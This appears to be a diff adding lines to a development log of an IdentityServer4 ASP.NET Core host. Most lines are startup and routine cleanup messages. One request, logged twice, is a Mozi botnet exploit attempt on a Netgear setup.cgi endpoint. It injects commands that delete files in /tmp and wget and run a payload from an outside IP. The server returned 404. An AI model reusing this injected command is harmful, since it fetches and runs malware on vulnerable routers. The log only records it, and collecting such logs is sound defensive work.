@@ -463,3 +463,296 @@
 2021-03-02 14:25:12.800 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0097ms - processed: 0 items - remaining: 4 items
 2021-03-02 14:25:22.812 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 4 items
 2021-03-02 14:25:22.820 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0122ms - processed: 0 items - remaining: 4 items
+2021-03-02 14:34:56.053 +08:00 [INF] 启动 Host...
+2021-03-02 14:34:56.634 +08:00 [DBG] Hosting starting
+2021-03-02 14:34:56.661 +08:00 [INF] User profile is available. Using 'C:\Users\Administrator\AppData\Local\ASP.NET\DataProtection-Keys' as key repository and Windows DPAPI to encrypt keys at rest.
+2021-03-02 14:34:56.675 +08:00 [DBG] Reading data from file 'C:\Users\Administrator\AppData\Local\ASP.NET\DataProtection-Keys\key-301de34f-0b5b-46c2-855f-92f09ce31411.xml'.
+2021-03-02 14:34:56.701 +08:00 [DBG] Found key "301de34f-0b5b-46c2-855f-92f09ce31411".
+2021-03-02 14:34:56.715 +08:00 [DBG] Considering key "301de34f-0b5b-46c2-855f-92f09ce31411" with expiration date "2021-05-24T09:12:39.9238945+00:00" as default key.
+2021-03-02 14:34:56.738 +08:00 [DBG] Forwarded activator type request from Microsoft.AspNetCore.DataProtection.XmlEncryption.DpapiXmlDecryptor, Microsoft.AspNetCore.DataProtection, Version=5.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60 to Microsoft.AspNetCore.DataProtection.XmlEncryption.DpapiXmlDecryptor, Microsoft.AspNetCore.DataProtection, Culture=neutral, PublicKeyToken=adb9793829ddae60
+2021-03-02 14:34:56.741 +08:00 [DBG] Decrypting secret element using Windows DPAPI.
+2021-03-02 14:34:56.743 +08:00 [DBG] Forwarded activator type request from Microsoft.AspNetCore.DataProtection.AuthenticatedEncryption.ConfigurationModel.AuthenticatedEncryptorDescriptorDeserializer, Microsoft.AspNetCore.DataProtection, Version=5.0.0.0, Culture=neutral, PublicKeyToken=adb9793829ddae60 to Microsoft.AspNetCore.DataProtection.AuthenticatedEncryption.ConfigurationModel.AuthenticatedEncryptorDescriptorDeserializer, Microsoft.AspNetCore.DataProtection, Culture=neutral, PublicKeyToken=adb9793829ddae60
+2021-03-02 14:34:56.746 +08:00 [DBG] Opening CNG algorithm 'AES' from provider 'null' with chaining mode CBC.
+2021-03-02 14:34:56.749 +08:00 [DBG] Opening CNG algorithm 'SHA256' from provider 'null' with HMAC.
+2021-03-02 14:34:56.752 +08:00 [DBG] Using key "301de34f-0b5b-46c2-855f-92f09ce31411" as the default key.
+2021-03-02 14:34:56.752 +08:00 [DBG] Key ring with default key "301de34f-0b5b-46c2-855f-92f09ce31411" was loaded during application startup.
+2021-03-02 14:34:56.761 +08:00 [INF] Starting IdentityServer4 version 0.0.0-alpha.0.13+007c29072a4005a4c855a5b8eadf4b587c6dcb5f
+2021-03-02 14:34:56.772 +08:00 [INF] You are using the in-memory version of the persisted grant store. This will store consent decisions, authorization codes, refresh and reference tokens in memory only. If you are using any of those features in production, you want to switch to a different store implementation.
+2021-03-02 14:34:56.785 +08:00 [INF] Using the default authentication scheme idsrv for IdentityServer
+2021-03-02 14:34:56.785 +08:00 [DBG] Using idsrv as default ASP.NET Core scheme for authentication
+2021-03-02 14:34:56.786 +08:00 [DBG] Using idsrv as default ASP.NET Core scheme for sign-in
+2021-03-02 14:34:56.786 +08:00 [DBG] Using idsrv as default ASP.NET Core scheme for sign-out
+2021-03-02 14:34:56.786 +08:00 [DBG] Using idsrv as default ASP.NET Core scheme for challenge
+2021-03-02 14:34:56.786 +08:00 [DBG] Using idsrv as default ASP.NET Core scheme for forbid
+2021-03-02 14:34:56.900 +08:00 [DBG] Failed to locate the development https certificate at 'null'.
+2021-03-02 14:34:56.922 +08:00 [INF] Now listening on: http://0.0.0.0:8080
+2021-03-02 14:34:56.923 +08:00 [DBG] Loaded hosting startup assembly Host
+2021-03-02 14:34:56.923 +08:00 [INF] Application started. Press Ctrl+C to shut down.
+2021-03-02 14:34:56.923 +08:00 [INF] Hosting environment: Development
+2021-03-02 14:34:56.923 +08:00 [INF] Content root path: C:\Users\Administrator\source\repos\hello-ids4\src\IdentityServer4\host
+2021-03-02 14:34:56.923 +08:00 [DBG] Hosting started
+2021-03-02 14:37:32.710 +08:00 [DBG] Connection id "0HM6T8MKCESGV" accepted.
+2021-03-02 14:37:32.712 +08:00 [DBG] Connection id "0HM6T8MKCESGV" started.
+2021-03-02 14:37:33.165 +08:00 [INF] Request starting HTTP/1.0 GET http:///setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.12.132:52468/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1  
+2021-03-02 14:37:33.170 +08:00 [DBG] Wildcard detected, all requests with hosts will be allowed.
+2021-03-02 14:37:33.170 +08:00 [DBG] HTTP/1.0 request allowed with missing or empty host header.
+2021-03-02 14:37:33.176 +08:00 [DBG] The request path /setup.cgi does not match a supported file type
+2021-03-02 14:37:33.204 +08:00 [DBG] No candidates found for the request path '/setup.cgi'
+2021-03-02 14:37:33.204 +08:00 [DBG] Request did not match any endpoints
+2021-03-02 14:37:33.260 +08:00 [DBG] Login Url: /Account/Login
+2021-03-02 14:37:33.261 +08:00 [DBG] Login Return Url Parameter: ReturnUrl
+2021-03-02 14:37:33.261 +08:00 [DBG] Logout Url: /Account/Logout
+2021-03-02 14:37:33.261 +08:00 [DBG] ConsentUrl Url: /consent
+2021-03-02 14:37:33.261 +08:00 [DBG] Consent Return Url Parameter: returnUrl
+2021-03-02 14:37:33.261 +08:00 [DBG] Error Url: /home/error
+2021-03-02 14:37:33.261 +08:00 [DBG] Error Id Parameter: errorId
+2021-03-02 14:37:33.264 +08:00 [DBG] AuthenticationScheme: idsrv was not authenticated.
+2021-03-02 14:37:33.272 +08:00 [DBG] AuthenticationScheme: idsrv was not authenticated.
+2021-03-02 14:37:33.278 +08:00 [INF] HTTP GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://178.175.12.132:52468/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 responded 404 in 102.04341613249728 ms
+2021-03-02 14:37:33.284 +08:00 [INF] Request finished in 120.789ms 404 
+2021-03-02 14:37:33.287 +08:00 [DBG] Connection id "0HM6T8MKCESGV" disconnecting.
+2021-03-02 14:37:33.288 +08:00 [DBG] Connection id "0HM6T8MKCESGV" stopped.
+2021-03-02 14:37:33.291 +08:00 [DBG] Connection id "0HM6T8MKCESGV" sending FIN because: "The Socket transport's send loop completed gracefully."
+2021-03-02 14:39:33.267 +08:00 [DBG] HttpMessageHandler expired after 120000ms for client 'IdentityServer:BackChannelLogoutClient'
+2021-03-02 14:39:43.276 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:39:43.285 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0706ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:39:53.300 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:39:53.301 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0514ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:40:03.313 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:40:03.314 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0455ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:40:13.328 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:40:13.329 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0533ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:40:23.342 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:40:23.343 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0419ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:40:33.347 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:40:33.348 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0581ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:40:43.350 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:40:43.350 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0377ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:40:53.362 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:40:53.364 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.041ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:41:03.366 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:41:03.367 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0438ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:41:13.379 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:41:13.379 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0625ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:41:23.383 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:41:23.384 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.041ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:41:33.395 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:41:33.396 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0435ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:41:43.400 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:41:43.401 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0631ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:41:53.412 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:41:53.412 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0567ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:42:03.416 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:42:03.417 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0463ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:42:13.425 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:42:13.425 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0472ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:42:23.426 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:42:23.427 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0578ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:42:33.442 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:42:33.442 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0463ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:42:43.456 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:42:43.457 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0477ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:42:53.460 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:42:53.460 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0488ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:43:03.463 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:43:03.463 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.048ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:43:13.476 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:43:13.476 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0427ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:43:23.489 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:43:23.489 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0578ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:43:33.492 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:43:33.492 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0505ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:43:43.493 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:43:43.494 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0452ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:43:53.494 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:43:53.494 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0723ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:44:03.497 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:44:03.497 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.086ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:44:13.508 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:44:13.509 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0765ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:44:23.523 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:44:23.523 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0726ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:44:33.535 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:44:33.536 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0544ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:44:43.537 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:44:43.537 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:44:53.537 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:44:53.537 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0301ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:45:03.552 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:45:03.552 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0078ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:45:13.559 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:45:13.559 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0097ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:45:23.568 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:45:23.569 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0103ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:45:33.573 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:45:33.573 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0081ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:45:43.583 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:45:43.584 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0083ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:45:53.591 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:45:53.591 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:46:03.600 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:46:03.600 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:46:13.612 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:46:13.612 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0162ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:46:23.614 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:46:23.614 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0106ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:46:33.615 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:46:33.615 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:46:43.617 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:46:43.617 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0092ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:46:53.627 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:46:53.627 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0083ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:47:03.630 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:47:03.630 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0067ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:47:13.635 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:47:13.635 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0086ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:47:23.644 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:47:23.644 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:47:33.659 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:47:33.659 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:47:43.662 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:47:43.662 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0106ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:47:53.663 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:47:53.663 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0081ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:48:03.674 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:48:03.674 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:48:13.675 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:48:13.675 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0094ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:48:23.688 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:48:23.688 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0086ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:48:33.689 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:48:33.689 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:48:43.704 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:48:43.704 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0081ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:48:53.713 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:48:53.713 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0078ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:49:03.722 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:49:03.723 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0117ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:49:13.735 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:49:13.735 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:49:23.749 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:49:23.750 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0067ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:49:33.757 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:49:33.757 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0078ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:49:43.764 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:49:43.764 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0086ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:49:53.766 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:49:53.766 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0078ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:50:03.780 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:50:03.780 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0094ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:50:13.791 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:50:13.791 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0072ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:50:23.795 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:50:23.795 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:50:33.804 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:50:33.804 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0092ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:50:43.813 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:50:43.814 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0106ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:50:53.816 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:50:53.816 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0078ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:51:03.830 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:51:03.830 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0083ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:51:13.839 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:51:13.839 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0103ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:51:23.841 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:51:23.841 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0083ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:51:33.854 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:51:33.854 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:51:43.860 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:51:43.860 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0086ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:51:53.873 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:51:53.873 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0086ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:52:03.881 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:52:03.881 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0094ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:52:13.888 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:52:13.888 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0072ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:52:23.891 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:52:23.891 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:52:33.892 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:52:33.892 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:52:43.901 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:52:43.901 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0081ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:52:53.913 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:52:53.913 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0083ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:53:03.919 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:53:03.919 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0072ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:53:13.920 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:53:13.920 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0078ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:53:23.920 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:53:23.921 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0094ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:53:33.921 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:53:33.921 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:53:43.921 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:53:43.921 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0081ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:53:53.929 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:53:53.929 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0086ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:54:03.937 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:54:03.937 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:54:13.950 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:54:13.950 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0072ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:54:23.950 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:54:23.950 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0069ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:54:33.952 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:54:33.952 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:54:43.952 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:54:43.952 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:54:53.960 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:54:53.960 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0081ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:55:03.966 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:55:03.966 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.0075ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:55:13.967 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
+2021-03-02 14:55:13.967 +08:00 [DBG] Ending HttpMessageHandler cleanup cycle after 0.012ms - processed: 0 items - remaining: 1 items
+2021-03-02 14:55:23.982 +08:00 [DBG] Starting HttpMessageHandler cleanup cycle with 1 items
